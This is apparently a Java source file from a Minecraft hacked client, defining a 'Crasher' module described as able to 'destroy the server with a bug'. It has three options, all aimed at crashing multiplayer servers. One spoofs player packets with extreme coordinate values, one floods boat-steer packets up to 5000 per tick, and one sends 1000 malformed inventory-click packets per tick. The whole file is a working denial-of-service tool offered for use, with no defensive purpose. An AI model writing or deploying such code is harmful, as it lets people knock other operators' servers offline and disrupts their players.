package dev.cuican.staypro.module.modules.misc;

import dev.cuican.staypro.common.annotations.ModuleInfo;
import dev.cuican.staypro.event.events.network.PacketEvent;
import dev.cuican.staypro.module.Category;
import dev.cuican.staypro.module.Module;
import dev.cuican.staypro.setting.Setting;
import net.minecraft.entity.item.EntityBoat;
import net.minecraft.inventory.ClickType;
import net.minecraft.item.ItemStack;
import net.minecraft.network.play.client.CPacketClickWindow;
import net.minecraft.network.play.client.CPacketPlayer;
import net.minecraft.network.play.client.CPacketSteerBoat;
import net.minecraft.util.EnumHand;

@ModuleInfo(name = "Crasher", category = Category.MISC, description = "Destroy the server with a bug")
public class Crasher extends Module {
    public Setting<Boolean> pos = setting( "Position", false ) ;
    public Setting<Boolean> twoBeePvP = setting( "2b2tpvp", false ) ;
    public Setting<Boolean> boat = setting( "Boat", false ) ;
    public Setting <Integer> speed = setting( "Boat Amount", 500, 1, 5000 ).whenTrue(boat) ;
    @Override
    public void onPacketSend(PacketEvent.Send event) {
        if(fullNullCheck()){
            disable();
            return;
        }
        if (event.getPacket() instanceof CPacketPlayer && this.pos.getValue()) {
            CPacketPlayer e = (CPacketPlayer)event.getPacket();
            if (mc.player.ticksExisted % 2 == 0) {
                e.x = 1.7976931348623157E308D;
                e.z = 1.7976931348623157E308D;
            } else {
                e.x = 4.9E-324D;
                e.z = 4.9E-324D;
            }
        }

    }


    @Override
    public void onTick() {
        if(fullNullCheck()){
            disable();
        return;
        }
        int j;
        if (this.boat.getValue() && mc.player.ridingEntity instanceof EntityBoat) {
            for(j = 0; j < this.speed.getValue(); ++j) {
                mc.player.connection.sendPacket(new CPacketSteerBoat(true, true));
            }
        }

        if (this.twoBeePvP.getValue()) {
            for(j = 0; j < 1000; ++j) {
                ItemStack item = new ItemStack(mc.player.getHeldItem(EnumHand.MAIN_HAND).getItem());
                CPacketClickWindow packet = new CPacketClickWindow(0, 69, 1, ClickType.QUICK_MOVE, item, (short)1);
                mc.player.connection.sendPacket(packet);
            }
        }

    }
}
